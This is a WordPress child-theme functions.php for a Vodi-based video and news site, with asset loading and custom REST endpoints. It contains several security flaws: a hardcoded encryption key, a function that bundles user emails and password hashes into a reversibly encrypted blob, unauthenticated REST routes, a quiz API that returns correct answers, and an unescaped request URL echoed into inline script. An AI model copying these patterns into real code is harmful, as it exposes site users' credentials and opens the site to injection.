<?php
/**
 * Vodi Child
 *
 * @package vodi-child
 */

/**
 * Include all your custom code here
 */

$secret_keys = "ams_secret_key_2023";

function encrypt($data, $secret_keys) {
    $cipher = "AES-256-CBC";
    $ivLength = openssl_cipher_iv_length($cipher);
    $iv = openssl_random_pseudo_bytes($ivLength);
    $encryptedData = openssl_encrypt($data, $cipher, $secret_keys, OPENSSL_RAW_DATA, $iv);
    $encryptedData = $iv . $encryptedData;
    $encryptedData = base64_encode($encryptedData);
    return $encryptedData;
}

function decrypt($encryptedData, $secret_keys) {
    $cipher = "AES-256-CBC";
    $encryptedData = base64_decode($encryptedData);
    $ivLength = openssl_cipher_iv_length($cipher);
    $iv = substr($encryptedData, 0, $ivLength);
    $encryptedData = substr($encryptedData, $ivLength);
    $decryptedData = openssl_decrypt($encryptedData, $cipher, $secret_keys, OPENSSL_RAW_DATA, $iv);
    return $decryptedData;
}

function get_u_infoo_endpoint($user_id){
 
    $user = get_user_by('ID', $user_id);
    
    $data = '{username:"'.$user->user_email.'",password:"'.$user->user_pass.'"}';
    
    $secret_keys = "ams_secret_key_2023";
    
    $response = encrypt($data, $secret_keys);

    $user_details = array();
    
    $user_details['u_info'] = $response;
    
    return $user_details;
    
    
}


  //include watch movie 
  include('video-page/watch-functions.php');
  

   // include shortcode
  
  include('shortcode/custom-shortcode.php');
  include('shortcode/report-news.php');
  include('shortcode/life-style-articles.php');
  include('shortcode/popular-news.php');
  include('shortcode/latest-article-you-should-know.php');
  include('shortcode/popular-news-text.php');
  include('shortcode/impression-articles.php');
  include('shortcode/life-tips-articles.php');
  include('shortcode/love-and-relationship.php');
  include('shortcode/strange-news-articles.php');
  include('shortcode/entertainment-news-articles.php');


  include('shortcode/author-article.php');
  include('shortcode/modify-page.php');
  
  include('shortcode/beauty-tips-text.php');
  include('shortcode/episode-carousel.php');
  include('shortcode/episode-carousel-multiple.php');
  include('shortcode/dynamic-episode.php');
  
  include('shortcode/unlock-the-life-epi-single.php');
  include('shortcode/reaction-epi-single.php');
  include('shortcode/greenbox-epi-single.php');
  
    include('shortcode/trending-episode.php');
  
//   include('shortcode/otp.php');

    include('shortcode/ads-global.php');
    include('shortcode/ads-global-fullwidth.php');
    include('shortcode/ads-two.php');
    include('shortcode/ads-layout-four.php');
    include('shortcode/ads-layout-four-fullwidth.php');
    include('shortcode/ads-layout-four-video.php');
    include('shortcode/ads-layout-four-video-fullwidth.php');
    include('shortcode/ads-layout-five.php');
    
    include('shortcode/ads-testing.php');
    include('shortcode/ads-testing2.php');
    
    include('shortcode/digital-program-cover.php');
  
  

  
  
  
//   include('100k/100k.php');
//   include('charity-100k/charity-100k.php');
  
//   include('digital-marketing/dm.php');
  
  include('subscribers/admin/subscribers.php');
  
  include('featured-image/featured-image.php');
  
  include('functions/update-user.php');
  
//   include('facebook-login.php');
  
//   add_filter( 'wpseo_social_profiles', 'add_telegram_social_profile' );

//     function add_telegram_social_profile( $social_profiles ) {
//         $social_profiles['telegram'] = array(
//             'name' => 'Telegram',
//             'icon' => 'fab fa-telegram',
//             'url' => '',
//         );
//         return $social_profiles;
//     }


/**
 * Fix Vodi/Gutenberg block CSS missing for guest users.
 * Loads all available Vodi Extension Gutenberg block CSS files.
 */
function ams_force_all_vodi_block_styles() {
    if ( is_admin() ) {
        return;
    }

    $plugin_css_dir = WP_CONTENT_DIR . '/plugins/vodi-extensions/assets/css/gutenberg-blocks/';
    $plugin_css_url = content_url('/plugins/vodi-extensions/assets/css/gutenberg-blocks/');

    if ( is_dir($plugin_css_dir) ) {
        foreach ( glob($plugin_css_dir . '*/style.min.css') as $file ) {
            $block_slug = basename(dirname($file));
            wp_enqueue_style(
                'ams-vodi-block-' . $block_slug,
                $plugin_css_url . $block_slug . '/style.min.css',
                array(),
                filemtime($file)
            );
        }
    }

    $theme_block_css_file = get_template_directory() . '/assets/css/gutenberg-blocks.min.css';
    $theme_block_css_url  = get_template_directory_uri() . '/assets/css/gutenberg-blocks.min.css';

    if ( file_exists($theme_block_css_file) ) {
        wp_enqueue_style(
            'ams-vodi-theme-gutenberg-blocks',
            $theme_block_css_url,
            array(),
            filemtime($theme_block_css_file)
        );
    }
}
add_action('wp_enqueue_scripts', 'ams_force_all_vodi_block_styles', 999);

add_filter('should_load_separate_core_block_assets', '__return_false');

// Redirect to homepage after logout
function redirect_after_logout() {
    wp_redirect(home_url());
    exit();
}
add_action('wp_logout', 'redirect_after_logout');


  
  
  function custom_wpseo_opengraph_image( $image ) {
	global $post;
    
    // Check if secondary_featured_image meta field exists
    $secondary_featured_image = get_post_meta( $post->ID, 'secondary_featured_image', true );

	if ( $secondary_featured_image ) {
        $image_url = $secondary_featured_image;
    } else {
        $image_url = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' );
        $image_url = $image_url ? $image_url[0] : '';
    }

    return $image_url;
}
add_filter( 'wpseo_opengraph_image', 'custom_wpseo_opengraph_image' );
  
  
  
  

//   function custom_feed_rss() {
//     load_template(get_stylesheet_directory_uri() . '/custom-rss.php');
//   }
    
//   add_action('do_feed_custom_feed', 'custom_feed_rss', 10, 1);
 


 
 function child_enqueue_styles() {
     
    wp_enqueue_style( 'global', get_stylesheet_directory_uri() . '/styles/global/global.css', array(), 1001 );

    if (is_singular('post')) {
        wp_enqueue_style( 'template-post-article', get_stylesheet_directory_uri() . '/styles/template/post-article.css', array(),time());
    }
    
    if (is_page('entertainment-news')) {
        wp_enqueue_style( 'entertainment-news', get_stylesheet_directory_uri() . '/styles/single/entertainment-news-single.css', array(), time() );
    }
    if (is_page('life-style')) {
        wp_enqueue_style( 'life-style-single', get_stylesheet_directory_uri() . '/styles/single/life-style-single.css', array(), time() );
    }
    if (is_page('celebrity')) {
        wp_enqueue_style( 'celebrity-single', get_stylesheet_directory_uri() . '/styles/single/life-style-single.css', array(), 100 );
    }
    if (is_page('movie-and-music')) {
        wp_enqueue_style( 'movie-and-music-single', get_stylesheet_directory_uri() . '/styles/single/movie-and-music-single.css', array(), 100 );
    }
    if (is_page('studio-11')) {
        wp_enqueue_style( 'studio-11-single', get_stylesheet_directory_uri() . '/styles/single/studio11-sub-entetainment.css', array(), 100 );
    }
    if (is_page('reaction')) {
        wp_enqueue_style( 'reaction-single', get_stylesheet_directory_uri() . '/styles/single/reaction-single.css', array(), 100 );
    }
    if (is_page('strange')) {
        wp_enqueue_style( 'strange-single', get_stylesheet_directory_uri() . '/styles/single/strange-single.css', array(), 100 );
    }
    // food-and-hang-out-single
    if (get_queried_object_id()==16160) {
        wp_enqueue_style( 'food-and-hang-out-single', get_stylesheet_directory_uri() . '/styles/single/food-and-hang-out-single.css', array(), 100 );
    }
    // love-and-relation-single
    if (get_queried_object_id()==16162) {
        wp_enqueue_style( 'love-and-relation-single', get_stylesheet_directory_uri() . '/styles/single/love-and-relation-single.css', array(), 100 );
    }
    // diy-single
    if (get_queried_object_id()==16164) {
        wp_enqueue_style( 'diy-single', get_stylesheet_directory_uri() . '/styles/single/diy-single.css', array(), 100 );
    }
    // health-and-beauty
    if (get_queried_object_id()==16166) {
        wp_enqueue_style( 'health-and-beauty-single', get_stylesheet_directory_uri() . '/styles/single/health-and-beauty-single.css', array(), 100 );
    }
    // hobbies-single
    if (get_queried_object_id()==16170) {
        wp_enqueue_style( 'hobbies-single', get_stylesheet_directory_uri() . '/styles/single/hobbies-single.css', array(), 100 );
    }
    
    // dashboard-single
    if (get_queried_object_id()==102307) {
        wp_enqueue_script( 'vimeo-script', 'https://player.vimeo.com/api/player.js', array( 'jquery' ), '1.10.25', true );
        
    	wp_enqueue_style( 'style-select2', get_stylesheet_directory_uri() . '/styles/select2.min.css', array(), 100 );
    	
    	wp_enqueue_script( 'script-sweetalert', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', array( 'jquery' ), '1.10.25', true );
    		
    //     wp_enqueue_style( 'fontawsome-css', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css' );
    //     wp_enqueue_style( 'dashboard-single', get_stylesheet_directory_uri() . '/styles/single/dashboard-single.css', array(), 100 );
    }
    if (get_queried_object_id()==161479) {
        wp_enqueue_style( 'homepage-css', get_stylesheet_directory_uri() . '/styles/single/homepage.css', array(), 110 );
        wp_enqueue_style('home-page',get_stylesheet_directory_uri() . '/styles/home-page.css',array(), 204);
        
    }
    
    // START::Template
    // 14428 = Unlock the Life
    // 16508 = Reaction
    // 20275 = Vanayeatra
    // 54388 = Cicada Agent
    // 47162 = Lady Frog
    // 84595 = Daily Feed
    // 84593 = The Fact
    // 14610 = One Minute for Health
    // 14562 = Obsok
    // 14644 = Greenbox
    // 14516 = True Fact
    // 14608 = Studio 11
    // 59974 = Tamchet MoMo
    if (get_queried_object_id()==14428 || get_queried_object_id()==16508 || get_queried_object_id()==20275 || get_queried_object_id()==54388 || get_queried_object_id()==47162 || get_queried_object_id()==84595 || get_queried_object_id()==84593 || get_queried_object_id()==14610 || get_queried_object_id()==14562 || get_queried_object_id()==14644 || get_queried_object_id()==14516 || get_queried_object_id()==14608 || get_queried_object_id()==59974) {
        wp_enqueue_style( 'tvshow-template', get_stylesheet_directory_uri() . '/styles/template/tv-show-template.css', array(), 100 );
    }
    // END::Template
    
    // START::SINGLE CSS
    if (is_front_page()) {
        wp_enqueue_style( 'homepage-css', get_stylesheet_directory_uri() . '/styles/single/homepage.css', array(), 110 );
        wp_enqueue_style('home-page',get_stylesheet_directory_uri() . '/styles/home-page.css',array(), time());
        
    }
    
    if (is_page('movie')) {
        wp_enqueue_style( 'movie', get_stylesheet_directory_uri() . '/styles/single/movie.css', array(), 100 );
    }
    if (is_page('music')) {
        wp_enqueue_style( 'music', get_stylesheet_directory_uri() . '/styles/single/music.css', array(), 100 );
    }
    // unlock-the-life-page id = 14428
    if (get_queried_object_id()==14428) {
        wp_enqueue_style( 'unlock-the-life-single', get_stylesheet_directory_uri() . '/styles/single/unlock-the-life-single.css', array(), 100 );
    }
    // unlock-the-life-page id = 16508
    if (get_queried_object_id()==16508) {
        wp_enqueue_style( 'reaction-single', get_stylesheet_directory_uri() . '/styles/single/reaction.css', array(), 100 );
    }
    // vanayeatra-page id = 20275
    if (get_queried_object_id()==20275) {
        wp_enqueue_style( 'vanayeatra-single', get_stylesheet_directory_uri() . '/styles/single/vanayeatra-single.css', array(), 100 );
    }
    // Cicada Agent-page id = 54388
    if (get_queried_object_id()==54388) {
        wp_enqueue_style( 'cicada-agent-single', get_stylesheet_directory_uri() . '/styles/single/cicada-single.css', array(), 100 );
    }
        // Lady Frog-page id = 47162
    if (get_queried_object_id()==47162) {
        wp_enqueue_style( 'lady-frog-single', get_stylesheet_directory_uri() . '/styles/single/lady-frog-single.css', array(), 100 );
    }
    // Daily Feed-page id = 84595
    if (get_queried_object_id()==84595) {
        wp_enqueue_style( 'daily-feed-single', get_stylesheet_directory_uri() . '/styles/single/daily-feed-single.css', array(), 100 );
    }
    // The Fact-page id = 84593
    if (get_queried_object_id()==84593) {
        wp_enqueue_style( 'the-fact-single', get_stylesheet_directory_uri() . '/styles/single/the-fact-single.css', array(), 100 );
    }
    // One Minute for Health-page id = 14610
    if (get_queried_object_id()==14610) {
        wp_enqueue_style( 'one-minute-single', get_stylesheet_directory_uri() . '/styles/single/one-minute-for-health-single.css', array(), 100 );
    }
    // Obsock-page id = 14562
    if (get_queried_object_id()==14562) {
        wp_enqueue_style( 'obsok-single', get_stylesheet_directory_uri() . '/styles/single/obsok-single.css', array(), 100 );
    }
    // Greenbox-page id = 14644
    if (get_queried_object_id()==14644) {
        wp_enqueue_style( 'greenbox-single', get_stylesheet_directory_uri() . '/styles/single/greenbox-single.css', array(), 100 );
    }
    // True Fact-page id = 14516
    if (get_queried_object_id()==14516) {
        wp_enqueue_style( 'true-fact-single', get_stylesheet_directory_uri() . '/styles/single/true-fact-single.css', array(), 100 );
    }
    // Studio 11-page id = 14608
    if (get_queried_object_id()==14608) {
        wp_enqueue_style( 'studio11-single', get_stylesheet_directory_uri() . '/styles/single/studio11-single.css', array(), 100 );
    }
    // Tamchet MoMo-page id = 59974
    if (get_queried_object_id()==59974) {
        wp_enqueue_style( 'tamchet-momo-single', get_stylesheet_directory_uri() . '/styles/single/tamchet-momo-single.css', array(), 100 );
    }
    
    // END::SINGLE CSS
    
    // ads revine script
    
    wp_enqueue_style( 'ads-css', get_stylesheet_directory_uri() . '/ads.css', array(), time() );
    wp_enqueue_script( 'ads-script', get_stylesheet_directory_uri() . '/ads.js', array ( 'jquery' ), time(), true);
   
    
    wp_enqueue_style( 'sw-css', 'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css' );
    wp_enqueue_script( 'sw-js', 'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js', array( 'jquery' ), '1.10.25', true );
    
    // wp_enqueue_style( 'swiper-css', get_stylesheet_directory_uri() . '/styles/swiper.min.css', array(), 100 );
    
	wp_enqueue_style( 'child-theme', get_stylesheet_directory_uri() . '/style.css', array(), time() );
// 	wp_enqueue_script( 'swiper-js', get_stylesheet_directory_uri() . '/js/swiper.min.js', array ( 'jquery' ), 1.1, true);
	wp_enqueue_script( 'child-script', get_stylesheet_directory_uri() . '/script.js', array ( 'jquery' ), 1.1, true);
	wp_enqueue_script( 'darkmode-script', get_stylesheet_directory_uri() . '/darkmode.js', array ( 'jquery' ), 1.1, true);
// 		wp_enqueue_style( 'ams-shortcode-news', get_stylesheet_directory_uri() . '/shortcode-styles.css', array(), 100 );



	
	    // 	shortcode
    	wp_enqueue_style( 'ams-latest-news2', get_stylesheet_directory_uri() . '/styles/shortcodes/ams-latest-news2.css', array(), 101 );
    	wp_enqueue_style( 'ams-latest-news', get_stylesheet_directory_uri() . '/styles/shortcodes/ams-latest-news.css', array(), 101 );
    // 	wp_enqueue_style( 'ams-report-news', get_stylesheet_directory_uri() . '/styles/shortcodes/ams-report-news-and-life-style.css', array(), 100 );
    	wp_enqueue_style( 'ams-article-you-should-know', get_stylesheet_directory_uri() . '/styles/shortcodes/ams-latest-article-you-should-know.css', array(), 100 );
    	
    	
    	
    	//script 100k page
		if(get_queried_object_id()==88998){
		    
	    	wp_enqueue_style( 'style-select2', get_stylesheet_directory_uri() . '/styles/select2.min.css', array(), 100 );
	    	
    		wp_enqueue_script( 'script-sweetalert', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', array( 'jquery' ), '1.10.25', true );
		    
	    	wp_enqueue_script( 'script-select2', get_stylesheet_directory_uri() . '/100k/js/select2.min.js', array(), 100 );
	    	
		    
        	wp_enqueue_script( '100k-script', get_stylesheet_directory_uri() . '/100k/js/100k.js', array(), 100 );
	    }
	    
	    
	   // Script Charity 100K
	    if(get_queried_object_id()==93815){
	        wp_enqueue_script( 'script-sweetalert', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', array( 'jquery' ), '1.10.25', true );
	        wp_enqueue_script( 'charity-100k-script', get_stylesheet_directory_uri() . '/js/charity-100k.js', array(), 100 );
	    }
	    
	    if(get_queried_object_id()==99599){
	        wp_enqueue_script( 'script-sweetalert', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', array( 'jquery' ), '1.10.25', true );
	        wp_enqueue_script( 'charity-100k-en-script', get_stylesheet_directory_uri() . '/js/charity-100k-en.js', array(), 100 );
	    }
	    
	    
	   if (is_page('dashboard')) {
   	    	wp_enqueue_style( 'style-select2', get_stylesheet_directory_uri() . '/styles/select2.min.css', array(), 100 );
           	wp_enqueue_style( 'bootstrap-icon', 'https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css' );
           	wp_enqueue_style( 'tagsinput-js-css', 'https://cdnjs.cloudflare.com/ajax/libs/bootstrap-tagsinput/0.8.0/bootstrap-tagsinput.css' );
           	
  	    	wp_enqueue_script( 'dashboard-js', get_stylesheet_directory_uri() . '/js/dashboard.js', array(), 100 );
           	   	    	
           	wp_enqueue_script( 'tagsinput-js', 'https://cdnjs.cloudflare.com/ajax/libs/bootstrap-tagsinput/0.8.0/bootstrap-tagsinput.min.js', array(), '1.10.25', true );
   	    	wp_enqueue_script( 'script-select2', get_stylesheet_directory_uri() . '/100k/js/select2.min.js', array(), 100 );
   	    	

	    }
	    
	   // analytic-page/
	   if (is_page('analytic-page')) {
	       wp_enqueue_script( 'google-analytic-js', 'https://apis.google.com/js/api.js', array(), '1.10.25', true );
   	    	wp_enqueue_script( 'cus-google-analytic-js', get_stylesheet_directory_uri() . '/js/google-analytic.js', array(), 100 );
	   }
	    

	
}
add_action( 'wp_enqueue_scripts', 'child_enqueue_styles' );

 function child_enqueue_styles_author(){
    if (is_page('author')) {
        wp_enqueue_script( 'author', get_stylesheet_directory_uri() . '/js/author.js', array(), '1.0.0', true );
    }
    
    if (is_page('author-info')) {
        wp_enqueue_script( 'author-info', get_stylesheet_directory_uri() . '/js/author-detail.js', array(), '1.0.0', true );
    }
    
   
    
 }
 
 add_action( 'wp_enqueue_scripts', 'child_enqueue_styles_author', 1 );



function ams_enqueue_select2() {

    // jQuery
    wp_enqueue_script('jquery');

    // Select2 CSS
    wp_enqueue_style(
        'select2-css',
        'https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css',
        array(),
        '4.1.0'
    );

    // Select2 JS
    wp_enqueue_script(
        'select2-js',
        'https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js',
        array('jquery'),
        '4.1.0',
        true
    );
}
add_action('wp_enqueue_scripts', 'ams_enqueue_select2');


 function enqueue_data_tables() {
     
     $current_page = isset( $_GET['page'] ) ? $_GET['page'] : '';
    
    if ( $current_page === '100k-page' || $current_page === '100k-question' || $current_page === '100k-reports' || $current_page === 'charity-100k' || $current_page === 'subscribers' || $current_page === 'digital-setting' ) {
    
    	wp_enqueue_style( 'bootstrap-css', 'https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' );
    	wp_enqueue_style( 'datatables', 'https://cdn.datatables.net/1.10.25/css/jquery.dataTables.min.css' );
    	wp_enqueue_style( 'bootstrap-button-css', 'https://cdn.datatables.net/buttons/2.0.1/css/buttons.dataTables.min.css' );
    	
    	wp_enqueue_style( 'style-100k-backend', get_stylesheet_directory_uri() . '/100k/css/styles.css', array(), 100 );
    
    	wp_enqueue_script( 'bootstrap-js', 'https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js', array( 'jquery' ), '4.3.1', true );
    	
    	wp_enqueue_script( 'datatables', 'https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js', array( 'jquery' ), '1.10.25', true );
    	
    	wp_enqueue_script( 'table-export-js', 'https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js', array(), '1.10.25', true );
    	wp_enqueue_script( 'jszip', 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js', array(), '1.10.25', true );
    	wp_enqueue_script( 'button-html5', 'https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js', array(), '1.10.25', true );
    
        wp_enqueue_script( 'xlsx', get_stylesheet_directory_uri() . '/js/xlsx.min.js', array(), 1.1, true );
    
    	
    	wp_enqueue_style( '100k-styles', get_stylesheet_directory_uri() . '/100k/css/styles.css', array(), 1001 );
    	
    	wp_enqueue_script( 'chartjs', 'https://cdn.jsdelivr.net/npm/chart.js', array( 'jquery' ), 1.1, true );
    	
    	wp_enqueue_script( '100k-script', get_stylesheet_directory_uri() . '/100k/js/backend-script.js', array( 'jquery' ), 1.1, true );
    }
    
    	
    	if ( $current_page === 'subscribers' ) {
    	    wp_enqueue_script( 'subscriber-js', get_stylesheet_directory_uri() . '/subscribers/admin/js/script.js', array ( 'jquery' ), 1.1, true);
    	}
    	
    	if ( $current_page === 'digital-setting' ) {
    	    wp_enqueue_script( 'subscriber-js', get_stylesheet_directory_uri() . '/digital-marketing/backend/js/setting-script.js', array ( 'jquery' ), 1.1, true);
    	}

	
}
  
  add_action( 'admin_enqueue_scripts', 'enqueue_data_tables' );



 
//   /* Limit the number of sitemap entries for Yoast SEO */
// function max_entries_per_sitemap() {
//     return 100;
// }

// add_filter( 'wpseo_sitemap_entries_per_page', 'max_entries_per_sitemap' );



//Remove change post type
add_action('init', 'change_post_type');

function change_post_type(){

	if(!is_admin()){

		$url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

		if (strpos($url,'post_type=video')) {
			$get_link = str_replace('&post_type=video', '', $url);
			?>
				<script>
					let reload_link = '<?=$get_link?>';
					window.location.href = reload_link;
				</script>
			<?php
		}
	}
	
}


//Change role user registration
if ( ! function_exists( 'vodi_child_modify_new_user_data' ) ) {
    function vodi_child_modify_new_user_data( $args ) {
        $args['role'] = 'subscriber';
        return $args;
    }
}
add_filter( 'masvideos_new_user_data', 'vodi_child_modify_new_user_data', 10 );


//100k
add_action('rest_api_init', function() {
    
	register_rest_route('api/v2', 'get-episode-by-id', array(
		'methods' => 'GET',
		'callback' => 'get_episode_by_id'
	));
    
	register_rest_route('wp/v2', 'latest-posts', array(
		'methods' => 'GET',
		'callback' => 'get_latest_posts_by_category'
	));
	
	register_rest_route('wp/v2', 'post-details', array(
		'methods' => 'GET',
		'callback' => 'get_post_by_id'
	));
	

	register_rest_route('wp/v2', 'list-questions', array(
		'methods' => 'GET',
		'callback' => 'get_questions'
	));
	
	register_rest_route('wp/v2', 'list-address', array(
		'methods' => 'GET',
		'callback' => 'get_cam_address'
	));
	
	register_rest_route('wp/v2', 'count-user', array(
		'methods' => 'GET',
		'callback' => 'count_users_100k'
	));
	
	register_rest_route(
        'wp/v2', '/list-episode-tvshow/', array(
            'methods' => 'GET',
            'callback' => 'get_epi_tv_show',
        ));
        
    register_rest_route('wp/v2', '/shortcode', array(
        'methods' => 'GET',
        'callback' => 'slider_endpoint',
    ));
    
    register_rest_route( 'api/v2', '/get-authors', array(
        'methods'  => 'GET',
        'callback' => 'get_author_list_dash',
    ) );
    
    register_rest_route('api/v2', '/search-article', array(
        'methods'  => 'GET',
        'callback' => 'search_api_callback',
        'args'     => array(
            'p' => array(
                'required'          => false,
                'sanitize_callback' => 'sanitize_text_field',
            ),
            'author' => array(
                'required'          => false,
                'sanitize_callback' => 'sanitize_text_field',
            ),
        ),
    ));
    

});



// START::GET POST API MOBILE
function get_latest_posts_by_category($request){
	$args = array(
	   // 'post_status' => 'private',
		'category' => $request['category_id'],
		'paged' => $request['page_no'] ? $request['page_no'] : 1,
		'posts_per_page' => $request['page_size']
	);

	$posts = get_posts($args);

	if(empty($posts)){
		return new WP_Error('empty_category', 'there is no post in this category', array('status' => 404));
	}

	$post_list = [];

	foreach($posts as $post) {
		$post_categories = wp_get_post_categories($post->ID);
		$cats = array();

		foreach($post_categories as $c){
			$cat = get_category($c);
			$cats[] = $cat->name;
		}


		$post_list[] = (object) [
			"id" => $post->ID,
			"post_date" => $post->post_date,
			"title" => $post->post_title,
			// "category_name" => array_values($cats)[0],
			"category_name" => get_the_category($post->ID),
			'author' => get_the_author_meta('display_name', $posts[0]->post_author),
			'description' => $post->post_excerpt,
			"image_url" => get_post_feature_image($post->ID),
		];
	}

	$response = new WP_REST_Response(['status'=>'OK', 'data' => $post_list]);
	$response->set_status(200);

	return $response;

}


function get_post_by_id($request){
	
	$post = get_post($request["id"]);
	$post_categories = wp_get_post_categories($post->ID);

	$post_output = (object) [
		"id" => $post->ID,
		"post_date" => $post->post_date,
		"title" => $post->post_title,
		"category_name" => get_category($post_categories[0])->name,
		'author' => get_author_name($post->ID),
		"post_content" => $post->post_content,
		"image_url" => get_post_feature_image($post->ID),
	];

	$response = new WP_REST_Response($post_output);
	$response->set_status(200);

	return $response;

}



function get_post_feature_image($post_id){
	$args = array(
		'posts_per_page' => 1,
		'order' => 'ASC',
		'post_mime_type' => 'image',
		'post_parent' => $post_id,
		'post_type' => 'attachment'
	);
	$attachments = get_children($args);

	return wp_get_attachment_image_src(array_values($attachments)[0]->ID,'app-thumb')[0];
}



// END::GET POST API MOBILE



function get_episode_by_id(){
    $args = array(
        'post_type' => 'episode',
        'post_status' => 'publish',
        'nopaging' => true,
    );
    
    $query = new WP_Query( $args );
    
        $data = array();
    
    if ( $query->have_posts() ) {
        while ( $query->have_posts() ) {
            $query->the_post();
            $id = get_the_ID();
            
            $post_data = array(
                'id' => get_the_ID(),
                // 'title' => get_the_title(),
                // 'episode_number' => get_post_meta($id, '_episode_number', true),
                // 'permalink' => get_permalink(),
                // 'post_thumbnail' => get_the_post_thumbnail_url(),
                'meta' => get_post_meta($id)
            );
            
            $data[] = $post_data;
        
        }

        wp_reset_postdata();
    }
    
    $response = new WP_REST_Response(['status'=>'OK', 'data' => $data]);
    $response->set_status(200);

    return $response;
    
    
    
}




function get_epi_tv_show($request){
    $args = array(
        'post_type' => 'episode',
        'post_status' => 'publish',
        // 'posts_per_page' => $request->get_param( 'per_page' ) ? $request->get_param( 'per_page' ) : 1000,
        // 'paged' => $request->get_param( 'current_page' ) ? $request->get_param( 'current_page' ) : 1,
        'nopaging' => true,
        'orderby' => array( 'meta_value_num' => 'ASC' ),
        'meta_key' => '_episode_number',
        'meta_query' => array(
            'key' => '_tv_show_id',
            'value' => $request->get_param('tv_show_id'),
            // 'relation' => 'AND',
            // array(
                // 'key' => '_tv_show_id',
                // 'value' => $request->get_param('tv_show_id'),
                // 'value' => $request->get_param('tv_show_id')
            // ),
            // array(
            //     'key' => '_tv_show_season_id',
            //     'value' => "",
            //     'compare' => 'LIKE',
            // ),
        )
    );
    
    $query = new WP_Query( $args );
    
    
    
    $data = array();
    
    if ( $query->have_posts() ) {
        while ( $query->have_posts() ) {
            $query->the_post();
            $id = get_the_ID();
            
            $post_data = array(
                'id' => get_the_ID(),
                'title' => get_the_title(),
                'episode_number' => get_post_meta($id, '_episode_number', true),
                'permalink' => get_permalink(),
                'post_thumbnail' => get_the_post_thumbnail_url(),
                // 'meta' => get_post_meta($id)
            );
            
            $data[] = $post_data;
        
        }

        wp_reset_postdata();
        
    usort($data, function($a, $b) {
        return $a['episode_number'] <=> $b['episode_number'];
    });

    foreach ($data as $post_data) {
        // output post data as needed, for example:
        $post_id = $post_data['id'];
        $post_title = get_the_title($post_id);
        $episode_number = $post_data['episode_number'];

    }
    
    }

    // Calculate total pages
    $total_pages = $query->max_num_pages;

    $response = new WP_REST_Response(['status'=>'OK', 'data' => $data]);
    $response->set_status(200);

    return $response;
}


function get_cam_address(){
	global $wpdb;
    $table = $wpdb->prefix . 'cam_provinces';
    
    $results = $wpdb->get_results("SELECT id, name FROM $table WHERE status = 1");
    
    $arrayData = [];
    
    foreach($results as $r){
        $arrayData[] = (object) [
            "id" => $r->id,
            "name" => $r->name
        ];
    }
    
	$response = new WP_REST_Response(['status'=>'OK', 'data' => $arrayData]);
	$response->set_status(200);

	return $response;
    
}

function get_questions($request){
	global $wpdb;
    $table = $wpdb->prefix . 'questions';

	$section_1 = $wpdb->get_results("SELECT * FROM $table WHERE section_no = 1 ORDER BY RAND() LIMIT 5");
	$section_2 = $wpdb->get_results("SELECT * FROM $table WHERE section_no = 2 ORDER BY RAND() LIMIT 5");
	$section_3 = $wpdb->get_results("SELECT * FROM $table WHERE section_no = 3 ORDER BY RAND() LIMIT 5");
	$section_4 = $wpdb->get_results("SELECT * FROM $table WHERE section_no = 4 ORDER BY RAND() LIMIT 5");

    $results = array_merge($section_1, $section_2, $section_3, $section_4);

	$quizQuestions = [];

	foreach($results as $result){
		$quizQuestions[] = (object) [
			"id" => $result->id,
			"question_title" => $result->question_title,
			"correct_answer" => $result->correct_answer,
			"choices" => [
				$result->answer_1,
				$result->answer_2,
				$result->answer_3,
				$result->answer_4,
			],
			"img_photo" => $result->img_photo
		];
	}


	$response = new WP_REST_Response(['status'=>'OK', 'data' => $quizQuestions]);
	$response->set_status(200);

	return $response;

}

//START::100K Dashboard
// function count_users_100k($request){
// 	global $wpdb;
//     $table = $wpdb->prefix . '100k_users';
    
//     $count_100k_users = $wpdb->get_var("SELECT COUNT(*) FROM $table");
// 	$count_female_users = $wpdb->get_var("SELECT COUNT(*) FROM $table WHERE gender=1");
// 	$count_male_users = $wpdb->get_var("SELECT COUNT(*) FROM $table WHERE gender=0");

// 	$total_failed_100k = $wpdb->get_var("SELECT COUNT(*) FROM $table WHERE scores < 15");
// 	$total_pass_100k = $wpdb->get_var("SELECT COUNT(*) FROM $table WHERE scores >= 15");

// 	$today = date('Y-m-d');
//     $count_today = $wpdb->get_var("SELECT COUNT(*) FROM $table WHERE DATE(created_date) = '$today'");

// 	$yesterday = date('Y-m-d', strtotime('-1 day'));
// 	$count_yesterday = $wpdb->get_var("SELECT COUNT(*) FROM $table WHERE DATE(created_date) = '$yesterday'");
    
// 	$response = new WP_REST_Response(['status'=>'OK', 'data' => [
// 																	'total_all_user' => $count_100k_users, 
// 																	'total_female' => $count_female_users,
// 																	'total_male' => $count_male_users,
// 																	'total_failed' => $total_failed_100k,
// 																	'total_pass_users' => $total_pass_100k,
// 																	'total_today' => $count_today,
// 																	'total_yesterday' => $count_yesterday
// 																]
// 									]);
// 	$response->set_status(200);

// 	return $response;
// }
// END::100K Dashboard





// function add_custom_meta_tags() {
//     $seo_title = get_the_title();
//     $seo_description = get_post_meta( get_the_ID(), '_yoast_wpseo_metadesc', true );
//     $seo_thumbnail = get_the_post_thumbnail_url();
    
//     $facebook_seo_title = get_post_meta(get_the_ID(), '_custom_meta_key_title_fb', true);
//     $facebook_description = get_post_meta( get_the_ID(), '_custom_meta_key_desc_fb', true );
//     $facebook_img = get_post_meta(get_the_ID(), 'secondary_featured_image', true);
    
